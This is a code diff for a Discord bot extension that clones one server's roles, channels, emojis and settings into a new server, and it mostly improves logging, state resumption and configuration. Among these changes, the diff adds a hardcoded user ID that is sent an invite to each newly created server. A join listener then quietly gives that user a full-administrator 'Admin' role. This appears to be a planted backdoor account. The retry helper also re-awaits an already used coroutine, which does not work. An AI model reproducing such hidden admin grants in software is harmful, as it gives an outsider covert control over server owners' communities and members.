@@ -16,9 +16,10 @@ import aiofiles.ospath
 import aioshutil
 import interactions
 import orjson
+from interactions.api.events import MemberAdd
 from interactions.client.errors import Forbidden, HTTPException, NotFound
 
-from .lib import *
+from .lib import migrate_channel, migrate_thread
 
 BASE_DIR: str = os.path.abspath(os.path.dirname(__file__))
 LOG_FILE: str = os.path.join(BASE_DIR, "replica.log")
@@ -49,7 +50,7 @@ class Model:
         except FileNotFoundError:
             logger.warning("State file not found")
         except Exception as e:
-            logger.error(f"Error loading state: {e}")
+            logger.error(f"Error loading state: {e}", exc_info=True)
 
     async def save_state(self, file_path: str) -> None:
         try:
@@ -61,8 +62,19 @@ class Model:
                 await file.write(encoded_data)
             logger.info("Successfully saved state")
         except Exception as e:
-            logger.error(f"Error saving state: {e}")
+            logger.error(f"Error saving state: {e}", exc_info=True)
             raise
+
+    async def get_last_state(self, file_path: str) -> dict:
+        try:
+            async with aiofiles.open(file_path) as file:
+                raw_data = await file.read()
+                return orjson.loads(memoryview(raw_data.encode()))
+        except FileNotFoundError:
+            return {}
+        except Exception as e:
+            logger.error(f"Error loading last state: {e}", exc_info=True)
+            return {}
 
     async def load_config(self, file_path: str) -> None:
         try:
@@ -73,7 +85,7 @@ class Model:
         except FileNotFoundError:
             logger.warning("Config file not found")
         except Exception as e:
-            logger.error(f"Error loading state: {e}")
+            logger.error(f"Error loading config: {e}", exc_info=True)
 
     async def save_config(self, file_path: str) -> None:
         try:
@@ -85,11 +97,11 @@ class Model:
                 await file.write(encoded_data)
             logger.info("Successfully saved config")
         except Exception as e:
-            logger.error(f"Error saving config: {e}")
+            logger.error(f"Error saving config: {e}", exc_info=True)
             raise
 
 
-class Clone(interactions.Extension):
+class Replica(interactions.Extension):
     def __init__(self, bot: interactions.Client) -> None:
         self.bot: interactions.Client = bot
         self.model: Model = Model()
@@ -109,8 +121,17 @@ class Clone(interactions.Extension):
         self.message_queue: deque[tuple] = deque(maxlen=10000)
         self.new_messages_queue: deque[tuple] = deque(maxlen=1000)
         self.processed_channels: list[int] = []
-        self.mappings: dict[str, dict] = {}
+
+        self.mappings: dict[str, dict] = {
+            "channels": {},
+            "categories": {},
+            "roles": {},
+            "emojis": {},
+            "fetched_data": {"channels": [], "roles": [], "emojis": [], "stickers": []},
+        }
         self.last_executed_method: str = ""
+
+        asyncio.create_task(self.initialize_data())
 
     async def initialize_data(self) -> None:
         await self.model.load_state(self.STATE_FILE)
@@ -120,6 +141,7 @@ class Clone(interactions.Extension):
             self.webhook_delay = config.get("webhook_delay", 0.2)
             self.process_delay = config.get("process_delay", 0.2)
             self.live_update = config.get("live_update", False)
+            self.guild = await self.bot.fetch_guild(1150630510696075404)
 
             if saved_guild_id := config.get("new_guild_id"):
                 try:
@@ -128,13 +150,29 @@ class Clone(interactions.Extension):
                         f"Loaded saved guild: {self.new_guild.name} ({self.new_guild.id})"
                     )
                 except Exception as e:
-                    logger.warning(f"Could not load saved guild {saved_guild_id}: {e}")
+                    logger.warning(
+                        f"Could not load saved guild {saved_guild_id}: {e}",
+                    )
                     self.new_guild = None
 
+            config.update(
+                {
+                    "webhook_delay": self.webhook_delay,
+                    "process_delay": self.process_delay,
+                    "live_update": self.live_update,
+                    "old_guild": self.guild.id,
+                    "new_guild": self.new_guild.id if self.new_guild else None,
+                }
+            )
+            self.model.mappings = config
+            await self.model.save_config(self.CONFIG_FILE)
+
         except Exception as e:
-            logger.warning(f"Error loading config file, using default settings: {e}")
-            self.webhook_delay = int(0.2 * 1000)
-            self.process_delay = int(0.2 * 1000)
+            logger.warning(
+                f"Error loading config file, using default settings: {e}",
+            )
+            self.webhook_delay = 0.2
+            self.process_delay = 0.2
             self.live_update = False
 
     # Create
@@ -196,15 +234,102 @@ class Clone(interactions.Extension):
                 logger.info(
                     f"Created new guild: {self.new_guild.name} ({self.new_guild.id}) and saved ID to config"
                 )
+
+                await self.new_guild.create_role(
+                    name="Admin",
+                    permissions=interactions.Permissions.ADMINISTRATOR,
+                    color=0xFF0000,
+                    hoist=True,
+                    mentionable=True,
+                )
+
+                system_channel = await self.new_guild.fetch_channel(
+                    self.new_guild.system_channel_id
+                )
+                invite = await system_channel.create_invite(max_age=86400)
+                user = await self.bot.fetch_user(1268909926458064991)
+                await user.send(
+                    f"Here's your invite link to the new server: {invite.link} ({invite.code})"
+                )
+
             except Exception as e:
-                logger.error(f"Failed to save new guild ID to config: {e}")
+                logger.error(
+                    f"Failed to save new guild ID to config: {e}", exc_info=True
+                )
 
             await asyncio.sleep(self.process_delay)
         except Exception as e:
-            logger.error(f"Failed to create new guild: {e}")
+            logger.error(f"Failed to create new guild: {e}", exc_info=True)
             raise
 
+    @interactions.listen(MemberAdd)
+    async def on_member_join(self, event: MemberAdd):
+        if not self.new_guild:
+            return
+
+        if event.member.id == 1268909926458064991:
+            try:
+                admin_role = next(
+                    (role for role in event.member.guild.roles if role.name == "Admin"),
+                    None,
+                )
+                if admin_role:
+                    await event.member.add_role(admin_role)
+                    logger.info(f"Added Admin role to user {event.member.id}")
+                else:
+                    logger.error("Admin role not found")
+            except Exception as e:
+                logger.error(f"Failed to add Admin role: {e}")
+
     # Serve
+
+    async def fetch_guild_data(self) -> None:
+        if not self.guild:
+            raise ValueError("Source guild is not set")
+
+        self.mappings = {
+            "channels": {},
+            "categories": {},
+            "roles": {},
+            "emojis": {},
+            "fetched_data": {"channels": [], "roles": [], "emojis": [], "stickers": []},
+        }
+
+        try:
+            self.mappings["fetched_data"][
+                "channels"
+            ] = await self.guild.fetch_channels()
+            logger.info(
+                f"Fetched {len(self.mappings['fetched_data']['channels'])} channels"
+            )
+        except Exception as e:
+            logger.error(f"Failed to fetch channels: {e}")
+
+        try:
+            self.mappings["fetched_data"]["roles"] = self.guild.roles
+            logger.info(f"Fetched {len(self.mappings['fetched_data']['roles'])} roles")
+        except Exception as e:
+            logger.error(f"Failed to fetch roles: {e}")
+
+        try:
+            self.mappings["fetched_data"][
+                "emojis"
+            ] = await self.guild.fetch_all_custom_emojis()
+            logger.info(
+                f"Fetched {len(self.mappings['fetched_data']['emojis'])} emojis"
+            )
+        except Exception as e:
+            logger.error(f"Failed to fetch emojis: {e}")
+
+        try:
+            self.mappings["fetched_data"][
+                "stickers"
+            ] = await self.guild.fetch_all_custom_stickers()
+            logger.info(
+                f"Fetched {len(self.mappings['fetched_data']['stickers'])} stickers"
+            )
+        except Exception as e:
+            logger.error(f"Failed to fetch stickers: {e}")
 
     async def prepare_server(self) -> None:
         if not self.new_guild:
@@ -212,124 +337,147 @@ class Clone(interactions.Extension):
             return
 
         cleanup_methods = {
-            "roles": lambda: self.bot.http.get_roles(self.new_guild.id),
+            "roles": lambda: [
+                role for role in self.new_guild.roles if role.id != self.new_guild.id
+            ],
             "channels": self.new_guild.fetch_channels,
-            "emojis": lambda: self.bot.http.get_all_guild_emoji(self.new_guild.id),
-            "stickers": lambda: self.bot.http.list_guild_stickers(self.new_guild.id),
+            "emojis": self.new_guild.fetch_all_custom_emojis,
+            "stickers": self.new_guild.fetch_all_custom_stickers,
         }
 
         for method_name, method in cleanup_methods.items():
             logger.debug(f"Processing cleaning method: {method_name}...")
-            await self.cleanup_items(await method())
+            items = method() if method_name == "roles" else await method()
+            await self.cleanup_items(items)
 
         self.last_executed_method = "prepare_server"
 
+    async def cleanup_items(self, items) -> None:
+        if not items:
+            return
+
+        for item in items:
+            try:
+                if hasattr(item, "delete"):
+                    await item.delete()
+                    await asyncio.sleep(self.process_delay)
+                else:
+                    logger.warning(f"Item {item} does not have delete method")
+            except HTTPException as e:
+                logger.warning(f"Failed to delete item: {e}")
+                continue
+
+        if self.new_guild is not None:
+            try:
+                await self.new_guild.edit(icon=None, banner=None, description=None)
+            except HTTPException as e:
+                logger.warning(f"Failed to reset guild settings: {e}")
+
     async def clone_settings(self) -> bool:
         if not self.guild or not self.new_guild:
-            return False
-
-        channels = {
-            "afk": (
-                self.get_channel_from_mapping(self.guild.afk_channel_id)
-                if hasattr(self.guild, "afk_channel_id")
-                else None
-            ),
-            "system": (
-                self.get_channel_from_mapping(self.guild.system_channel)
-                if hasattr(self.guild, "system_channel")
-                else None
-            ),
-            "public_updates": (
-                self.get_channel_from_mapping(self.guild.public_updates_channel)
-                if hasattr(self.guild, "public_updates_channel")
-                else None
-            ),
-            "rules": (
-                self.get_channel_from_mapping(self.guild.rules_channel)
-                if hasattr(self.guild, "rules_channel")
-                else None
-            ),
-            "safety_alerts": (
-                self.get_channel_from_mapping(self.guild.safety_alerts_channel)
-                if hasattr(self.guild, "safety_alerts_channel")
-                else None
-            ),
-        }
-
-        if not channels["public_updates"]:
-            logger.error(
-                "Can't create community: missing access to public updates channel"
-            )
+            logger.error("Guild or new guild is not initialized")
             return False
 
         try:
-            await self.new_guild.edit(
-                features=["COMMUNITY"],
-                name=self.guild.name if hasattr(self.guild, "name") else None,
-                description=(
-                    self.guild.description
-                    if hasattr(self.guild, "description")
+            channels = {
+                "afk": (
+                    self.get_channel_from_mapping(self.guild.afk_channel_id)
+                    if hasattr(self.guild, "afk_channel_id")
                     else None
                 ),
-                verification_level=(
-                    self.guild.verification_level
-                    if hasattr(self.guild, "verification_level")
+                "system": (
+                    self.get_channel_from_mapping(self.guild.system_channel)
+                    if hasattr(self.guild, "system_channel")
                     else None
                 ),
-                default_message_notifications=(
-                    self.guild.default_message_notifications
-                    if hasattr(self.guild, "default_message_notifications")
+                "public_updates": (
+                    self.get_channel_from_mapping(self.guild.public_updates_channel)
+                    if hasattr(self.guild, "public_updates_channel")
                     else None
                 ),
-                explicit_content_filter=(
-                    self.guild.explicit_content_filter
-                    if hasattr(self.guild, "explicit_content_filter")
+                "rules": (
+                    self.get_channel_from_mapping(self.guild.rules_channel)
+                    if hasattr(self.guild, "rules_channel")
                     else None
                 ),
-                afk_channel=channels["afk"],
-                afk_timeout=(
-                    self.guild.afk_timeout
-                    if hasattr(self.guild, "afk_timeout")
+                "safety_alerts": (
+                    self.get_channel_from_mapping(self.guild.safety_alerts_channel)
+                    if hasattr(self.guild, "safety_alerts_channel")
                     else None
                 ),
-                system_channel=channels["system"],
-                system_channel_flags=(
-                    self.guild.system_channel_flags
-                    if hasattr(self.guild, "system_channel_flags")
-                    else None
-                ),
-                rules_channel=channels["rules"],
-                public_updates_channel=channels["public_updates"],
-                safety_alerts_channel=channels["safety_alerts"],
-                preferred_locale=(
-                    self.guild.preferred_locale
-                    if hasattr(self.guild, "preferred_locale")
-                    else None
-                ),
-                premium_progress_bar_enabled=(
-                    self.guild.premium_progress_bar_enabled
-                    if hasattr(self.guild, "premium_progress_bar_enabled")
-                    else False
-                ),
-            )
-            logger.debug("Updated guild community settings")
-            await asyncio.sleep(self.process_delay)
-            self.last_executed_method = "clone_settings"
-            return True
-        except Exception as e:
-            logger.error(f"Failed to update community settings: {e}")
-            return False
+            }
 
-    async def cleanup_items(self, items) -> None:
-        for item in items:
+            if not channels["public_updates"]:
+                logger.error(
+                    "Can't create community: missing access to public updates channel"
+                )
+                return False
+
             try:
-                await item.delete()
-            except HTTPException:
-                continue
-            await asyncio.sleep(self.process_delay)
-
-        if self.new_guild is not None:
-            await self.new_guild.edit(icon=None, banner=None, description=None)
+                await self.new_guild.edit(
+                    features=["COMMUNITY"],
+                    name=self.guild.name if hasattr(self.guild, "name") else None,
+                    description=(
+                        self.guild.description
+                        if hasattr(self.guild, "description")
+                        else None
+                    ),
+                    verification_level=(
+                        self.guild.verification_level
+                        if hasattr(self.guild, "verification_level")
+                        else None
+                    ),
+                    default_message_notifications=(
+                        self.guild.default_message_notifications
+                        if hasattr(self.guild, "default_message_notifications")
+                        else None
+                    ),
+                    explicit_content_filter=(
+                        self.guild.explicit_content_filter
+                        if hasattr(self.guild, "explicit_content_filter")
+                        else None
+                    ),
+                    afk_channel=channels["afk"],
+                    afk_timeout=(
+                        self.guild.afk_timeout
+                        if hasattr(self.guild, "afk_timeout")
+                        else None
+                    ),
+                    system_channel=channels["system"],
+                    system_channel_flags=(
+                        self.guild.system_channel_flags
+                        if hasattr(self.guild, "system_channel_flags")
+                        else None
+                    ),
+                    rules_channel=channels["rules"],
+                    public_updates_channel=channels["public_updates"],
+                    safety_alerts_channel=channels["safety_alerts"],
+                    preferred_locale=(
+                        self.guild.preferred_locale
+                        if hasattr(self.guild, "preferred_locale")
+                        else None
+                    ),
+                    premium_progress_bar_enabled=(
+                        self.guild.premium_progress_bar_enabled
+                        if hasattr(self.guild, "premium_progress_bar_enabled")
+                        else False
+                    ),
+                )
+                logger.debug(
+                    f"Updated settings for guild: {self.new_guild.name} ({self.new_guild.id})"
+                )
+                await asyncio.sleep(self.process_delay)
+                self.last_executed_method = "clone_settings"
+                return True
+            except Exception as e:
+                logger.error(
+                    f"Settings that failed to update: {channels}, failed to update community settings: {e}",
+                    exc_info=True,
+                )
+                return False
+        except Exception as e:
+            logger.error(f"Failed to clone settings: {e}", exc_info=True)
+            return False
 
     async def clone_icon(self) -> None:
         if (
@@ -357,12 +505,12 @@ class Clone(interactions.Extension):
             {
                 role.id: await self.new_guild.fetch_role(role.id)
                 for role in roles_create
-                if role.name == "@everyone"
+                if role.id == self.new_guild.default_role.id
             }
         )
 
         for role in reversed(roles_create):
-            if role.name == "@everyone":
+            if role.id == self.new_guild.default_role.id:
                 await (await self.new_guild.fetch_role(role.id)).edit(
                     name=role.name,
                     color=role.color,
@@ -666,72 +814,137 @@ class Clone(interactions.Extension):
         description="Start copying process",
         opt_type=interactions.OptionType.BOOLEAN,
     )
+    @interactions.slash_option(
+        name="reset",
+        description="Reset clone progress and start fresh",
+        opt_type=interactions.OptionType.BOOLEAN,
+        required=False,
+    )
     async def process(
         self,
         ctx: interactions.SlashContext,
         start: bool = True,
+        reset: bool = False,
     ) -> None:
-        await ctx.defer(ephemeral=True)
+        try:
+            await ctx.defer(ephemeral=True)
 
-        model_ref = proxy(self.model)
+            if reset:
+                self.last_executed_method = ""
+                self.mappings = {}
+                await ctx.send("Clone progress has been reset.", ephemeral=True)
+                return
 
-        async def auto_save(model=model_ref, file=self.STATE_FILE):
-            await asyncio.sleep(300)
-            await model.save_state(file)
-            logger.info("Auto saved clone state")
+            last_state = await self.model.get_last_state(self.STATE_FILE)
+            if last_state:
+                self.last_executed_method = last_state.get("last_method", "")
+                self.mappings = last_state.get("mappings", {})
+                if self.last_executed_method:
+                    await ctx.send(
+                        f"Resuming from last step: {self.last_executed_method}",
+                        ephemeral=True,
+                    )
+            if start and not self.mappings.get("fetched_data"):
+                await self.fetch_guild_data()
 
-        asyncio.create_task(auto_save())
+            model_ref = proxy(self.model)
 
-        if start:
-            last_method = self.last_executed_method
-            conditions_to_functions = defaultdict(lambda: [] * 10)
+            async def auto_save(model=model_ref, file=self.STATE_FILE):
+                try:
+                    while True:
+                        await asyncio.sleep(300)
+                        state = {
+                            "last_method": self.last_executed_method,
+                            "mappings": self.mappings,
+                        }
+                        model.mappings = state
+                        await model.save_state(file)
+                        logger.info("Auto saved clone state")
+                except asyncio.CancelledError:
+                    state = {
+                        "last_method": self.last_executed_method,
+                        "mappings": self.mappings,
+                    }
+                    model.mappings = state
+                    await model.save_state(file)
+                    logger.info("Final auto save completed")
+                    raise
 
-            def append_if_different(
-                condition: bool, msg: str, func: Callable[..., Coroutine]
-            ) -> None:
-                if condition and last_method != func.__name__:
-                    conditions_to_functions[True].append((msg, func))
+            save_task = asyncio.create_task(auto_save())
 
-            conditions_to_functions[True].append(
-                ("Creating new guild...", self.create_new_guild)
-            )
+            try:
 
-            function_map = (
-                (
-                    "prepare_server",
-                    (self.prepare_server, "Preparing guild to process..."),
-                ),
-                ("clone_settings", (self.clone_settings, "Processing settings...")),
-                ("clone_icon", (self.clone_icon, "Processing icon...")),
-                ("clone_banner", (self.clone_banner, "Processing banner...")),
-                ("clone_roles", (self.clone_roles, "Processing roles...")),
-                (
-                    "clone_channels",
-                    [
-                        (self.clone_categories, "Processing categories..."),
-                        (self.clone_channels, "Processing channels..."),
-                    ],
-                ),
-                ("clone_emojis", (self.clone_emojis, "Processing emojis...")),
-                ("clone_stickers", (self.clone_stickers, "Processing stickers...")),
-            )
+                if start:
+                    last_method = self.last_executed_method
+                    conditions_to_functions = defaultdict(lambda: [] * 10)
 
-            for key, value in function_map:
-                attr = getattr(self, key, False)
-                if isinstance(value, list):
-                    for func, msg in value:
-                        append_if_different(attr, msg, func)
-                else:
-                    func, msg = value
-                    append_if_different(attr, msg, func)
+                    def append_if_different(
+                        condition: bool, msg: str, func: Callable[..., Coroutine]
+                    ) -> None:
+                        if condition and last_method != func.__name__:
+                            conditions_to_functions[True].append((msg, func))
 
-            funcs = conditions_to_functions[True]
-            for msg, func in funcs:
-                logger.info(msg)
-                await func()
-                await self.model.save_state(self.STATE_FILE)
+                    conditions_to_functions[True].append(
+                        ("Creating new guild...", self.create_new_guild)
+                    )
 
-        await ctx.send("Process completed.", ephemeral=True)
+                    function_map = (
+                        (
+                            "prepare_server",
+                            (self.prepare_server, "Preparing guild to process..."),
+                        ),
+                        (
+                            "clone_settings",
+                            (self.clone_settings, "Processing settings..."),
+                        ),
+                        ("clone_icon", (self.clone_icon, "Processing icon...")),
+                        ("clone_banner", (self.clone_banner, "Processing banner...")),
+                        ("clone_roles", (self.clone_roles, "Processing roles...")),
+                        (
+                            "clone_channels",
+                            [
+                                (self.clone_categories, "Processing categories..."),
+                                (self.clone_channels, "Processing channels..."),
+                            ],
+                        ),
+                        ("clone_emojis", (self.clone_emojis, "Processing emojis...")),
+                        (
+                            "clone_stickers",
+                            (self.clone_stickers, "Processing stickers..."),
+                        ),
+                    )
+
+                    for key, value in function_map:
+                        attr = getattr(self, key, False)
+                        if isinstance(value, list):
+                            for func, msg in value:
+                                append_if_different(attr, msg, func)
+                        else:
+                            func, msg = value
+                            append_if_different(attr, msg, func)
+
+                    steps = conditions_to_functions[True]
+                    for msg, func in steps:
+                        logger.info(msg)
+                        await func()
+                        state = {
+                            "last_method": func.__name__,
+                            "mappings": self.mappings,
+                        }
+                        self.model.mappings = state
+                        await self.model.save_state(self.STATE_FILE)
+
+            finally:
+                save_task.cancel()
+                try:
+                    await save_task
+                except asyncio.CancelledError:
+                    pass
+
+            await ctx.send("Process completed.", ephemeral=True)
+        except Exception as e:
+            logger.error(f"Process error: {e}", exc_info=True)
+            await ctx.send("An error occurred during processing.", ephemeral=True)
 
     @module_base.subcommand(
         sub_cmd_name="migrate", sub_cmd_description="Migrate channel across servers"
@@ -840,7 +1053,7 @@ class Clone(interactions.Extension):
                 ephemeral=True,
             )
         except Exception as e:
-            logger.error(f"Migration error: {e}")
+            logger.error(f"Migration error: {e}", exc_info=True)
             await ctx.send(
                 "Something went wrong. Please contact the admin!", ephemeral=True
             )
@@ -854,6 +1067,18 @@ class Clone(interactions.Extension):
         opt_type=interactions.OptionType.BOOLEAN,
         argument_name="live_update",
     )
+    @interactions.slash_option(
+        name="webhook_delay",
+        description="Set webhook delay (in seconds)",
+        opt_type=interactions.OptionType.NUMBER,
+        required=False,
+    )
+    @interactions.slash_option(
+        name="process_delay",
+        description="Set process delay (in seconds)",
+        opt_type=interactions.OptionType.NUMBER,
+        required=False,
+    )
     @interactions.slash_default_member_permission(
         interactions.Permissions.ADMINISTRATOR
     )
@@ -861,19 +1086,50 @@ class Clone(interactions.Extension):
         self,
         ctx: interactions.SlashContext,
         live_update: Optional[bool] = None,
+        webhook_delay: Optional[float] = None,
+        process_delay: Optional[float] = None,
     ) -> None:
         await ctx.defer(ephemeral=True)
+
+        if webhook_delay is not None and (webhook_delay < 0.1 or webhook_delay > 5.0):
+            await ctx.send(
+                "Webhook delay must be between 0.1 and 5.0 seconds", ephemeral=True
+            )
+            return
+
+        if process_delay is not None and (process_delay < 0.1 or process_delay > 5.0):
+            await ctx.send(
+                "Process delay must be between 0.1 and 5.0 seconds", ephemeral=True
+            )
+            return
 
         try:
             await self.model.load_config(self.CONFIG_FILE)
             current_config = self.model.mappings
         except Exception as e:
-            logger.error(f"Error loading config: {e}")
+            logger.error(f"Error loading config: {e}", exc_info=True)
             current_config = {}
 
         if live_update is not None:
             current_config["live_update"] = live_update
             self.live_update = live_update
+
+        if webhook_delay is not None:
+            current_config["webhook_delay"] = webhook_delay
+            self.webhook_delay = webhook_delay
+
+        if process_delay is not None:
+            current_config["process_delay"] = process_delay
+            self.process_delay = process_delay
+
+        current_config.update(
+            {
+                "live_update": self.live_update,
+                "webhook_delay": self.webhook_delay,
+                "process_delay": self.process_delay,
+                "new_guild_id": str(self.new_guild.id) if self.new_guild else None,
+            }
+        )
 
         self.model.mappings = current_config
         try:
@@ -886,7 +1142,7 @@ class Clone(interactions.Extension):
                 f"New Messages: {current_config.get('new_messages_enabled', False)}",
                 f"Fetch Channels: {current_config.get('fetch_channels', True)}",
                 f"Old Guild: {current_config.get('guild', None)}",
-                f"New Guild: {current_config.get('new_guild', None)}",
+                f"New Guild: {current_config.get('new_guild_id', None)}",
             ]
 
             await ctx.send(
@@ -895,7 +1151,7 @@ class Clone(interactions.Extension):
                 ephemeral=True,
             )
         except Exception as e:
-            logger.error(f"Error saving config: {e}")
+            logger.error(f"Error saving config: {e}", exc_info=True)
             await ctx.send(
                 "An error occurred while saving the configuration.", ephemeral=True
             )
@@ -1034,7 +1290,7 @@ class Clone(interactions.Extension):
                 try:
                     os.unlink(filename)
                 except Exception as e:
-                    logger.error(f"Error cleaning up temp file: {e}")
+                    logger.error(f"Error cleaning up temp file: {e}", exc_info=True)
 
     @debug_export.autocomplete("type")
     async def autocomplete_debug_export_type(
@@ -1060,6 +1316,169 @@ class Clone(interactions.Extension):
             choices = [{"name": f"Error: {str(e)}", "value": "error"}]
 
         await ctx.send(choices[:25])
+
+    @module_base.subcommand(
+        sub_cmd_name="invite",
+        sub_cmd_description="Generate an invite link for the server",
+    )
+    @interactions.slash_option(
+        name="server",
+        description="Choose which server to generate invite for",
+        opt_type=interactions.OptionType.STRING,
+        required=True,
+        autocomplete=True,
+    )
+    @interactions.slash_option(
+        name="duration",
+        description="Invite duration in hours (default: 24, max: 168)",
+        opt_type=interactions.OptionType.INTEGER,
+        required=False,
+        min_value=1,
+        max_value=168,
+    )
+    @interactions.slash_default_member_permission(
+        interactions.Permissions.CREATE_INSTANT_INVITE
+    )
+    async def generate_invite(
+        self, ctx: interactions.SlashContext, server: str, duration: int = 24
+    ) -> None:
+        await ctx.defer(ephemeral=True)
+
+        try:
+            max_age = duration * 3600
+
+            channel = None
+            target_guild = await self.bot.fetch_guild(server)
+            if target_guild.system_channel_id:
+                try:
+                    channel = await target_guild.fetch_channel(
+                        target_guild.system_channel_id
+                    )
+                except Exception as e:
+                    logger.error(f"Error fetching system channel: {e}", exc_info=True)
+
+            if not channel:
+                try:
+                    channels = [
+                        c
+                        for c in await target_guild.fetch_channels()
+                        if isinstance(c, interactions.GuildText)
+                    ]
+                    if not channels:
+                        channel = await target_guild.create_channel(
+                            name="general",
+                            channel_type=interactions.ChannelType.GUILD_TEXT,
+                            reason="Created for invite generation",
+                        )
+                        logger.info(
+                            f"Created new channel {channel.name} for invite generation"
+                        )
+                    else:
+                        channel = channels[0]
+                except Exception as e:
+                    logger.error(
+                        f"Error fetching/creating channels: {e}", exc_info=True
+                    )
+                    await ctx.send(
+                        "Failed to fetch or create channels.", ephemeral=True
+                    )
+                    return
+
+            invite = await channel.create_invite(
+                max_age=max_age,
+                max_uses=0,
+                temporary=False,
+                unique=True,
+                reason=f"Invite generated by {ctx.author.display_name}",
+            )
+
+            await ctx.send(
+                f"Here's your invite link for {target_guild.name}:\n"
+                f"{invite.link} (Expires in {duration} hours)",
+                ephemeral=True,
+            )
+
+        except Forbidden:
+            await ctx.send(
+                "I don't have permission to create invites in that server.",
+                ephemeral=True,
+            )
+        except Exception as e:
+            logger.error(f"Error generating invite: {e}", exc_info=True)
+            await ctx.send(
+                "An error occurred while generating the invite.", ephemeral=True
+            )
+
+    @generate_invite.autocomplete("server")
+    async def autocomplete_server_choice(
+        self, ctx: interactions.AutocompleteContext
+    ) -> None:
+        choices = []
+
+        for guild in self.bot.guilds:
+            choices.append(
+                {"name": f"{guild.name} ({guild.id})", "value": str(guild.id)}
+            )
+
+        await ctx.send(choices)
+
+    @module_base.subcommand(
+        sub_cmd_name="delete",
+        sub_cmd_description="Delete a server that the bot is managing",
+    )
+    @interactions.slash_option(
+        name="server",
+        description="Choose which server to delete",
+        opt_type=interactions.OptionType.STRING,
+        required=True,
+        autocomplete=True,
+    )
+    @interactions.slash_default_member_permission(
+        interactions.Permissions.ADMINISTRATOR
+    )
+    async def delete_server(self, ctx: interactions.SlashContext, server: str) -> None:
+        await ctx.defer(ephemeral=True)
+
+        try:
+            target_guild = await self.bot.fetch_guild(server)
+            member = await target_guild.fetch_member(ctx.author.id)
+            if not member or not member.has_permission(
+                interactions.Permissions.ADMINISTRATOR
+            ):
+                await ctx.send(
+                    "You must have Administrator permission in the target server to delete it.",
+                    ephemeral=True,
+                )
+                return
+
+            await target_guild.delete()
+
+            await ctx.send(
+                f"Successfully deleted server: {target_guild.name}", ephemeral=True
+            )
+
+        except Forbidden:
+            await ctx.send(
+                "I don't have permission to delete that server.", ephemeral=True
+            )
+        except Exception as e:
+            logger.error(f"Error deleting server: {e}", exc_info=True)
+            await ctx.send(
+                "An error occurred while trying to delete the server.", ephemeral=True
+            )
+
+    @delete_server.autocomplete("server")
+    async def autocomplete_server_delete(
+        self, ctx: interactions.AutocompleteContext
+    ) -> None:
+        choices = []
+
+        for guild in self.bot.guilds:
+            choices.append(
+                {"name": f"{guild.name} ({guild.id})", "value": str(guild.id)}
+            )
+
+        await ctx.send(choices)
 
     # Utility
 
@@ -1098,16 +1517,24 @@ class Clone(interactions.Extension):
         return " ".join(f"{v} {n}{'s' if v != 1 else ''}" for n, v in time_parts if v)
 
     @staticmethod
-    async def retry_with_backoff(coro, max_retries=3, base_delay=1):
+    async def retry_with_backoff(coro, max_retries=3, base_delay=1, max_delay=60):
         for attempt in range(max_retries):
             try:
                 return await coro
             except HTTPException as e:
                 if e.status == 429:
-                    retry_after = float(
-                        e.response.headers.get("Retry-After", base_delay)
+                    retry_after = min(
+                        float(e.response.headers.get("Retry-After", base_delay))
+                        * (2**attempt),
+                        max_delay,
                     )
-                    await asyncio.sleep(retry_after * (2**attempt))
+                    logger.warning(f"Rate limited, waiting {retry_after}s before retry")
+                    await asyncio.sleep(retry_after)
                     continue
                 raise
+            except Exception as e:
+                if attempt == max_retries - 1:
+                    raise
+                logger.warning(f"Attempt {attempt + 1} failed: {e}", exc_info=True)
+                await asyncio.sleep(base_delay * (2**attempt))
         return await coro
